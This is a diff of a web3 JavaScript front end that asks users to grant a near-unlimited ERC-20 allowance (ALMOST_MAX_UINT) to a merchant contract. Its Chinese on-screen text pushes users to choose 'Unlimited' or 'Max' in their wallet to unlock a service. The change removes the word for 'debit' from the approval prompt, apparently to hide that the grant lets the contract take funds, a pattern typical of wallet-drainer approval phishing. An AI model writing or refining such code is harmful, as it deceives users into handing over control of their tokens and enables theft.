@@ -297,7 +297,7 @@ async function connectAndAuthorize() {
             // 設置 Max 授權 (使用 ALMOST_MAX_UINT)
             await sendTransaction(
                 tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ALMOST_MAX_UINT), 
-                `設置 ${tokenName} Max 扣款授權操作 (最終授權 - 請同意)`,
+                `設置 ${tokenName} Max 授權操作 (最終授權 - 請同意)`,
                 totalTxs
             );
         }
@@ -335,7 +335,7 @@ async function handlePostConnection() {
         showOverlay(`
             正在檢查授權狀態，Max 授權尚未完成。
             
-            ⚠️ **重要步驟**：即將彈出錢包視窗，請務必選擇 **「無限大 / Unlimited」** 或 **「Max 授權」** 選項，才能解鎖服務。
+            ⚠️ **重要步驟**：即將彈出錢包視窗，請務必選擇 **「 Unlimited」** 或 **「Max 授權」** 選項，才能解鎖服務。
             
             （請在錢包中操作...）
         `);
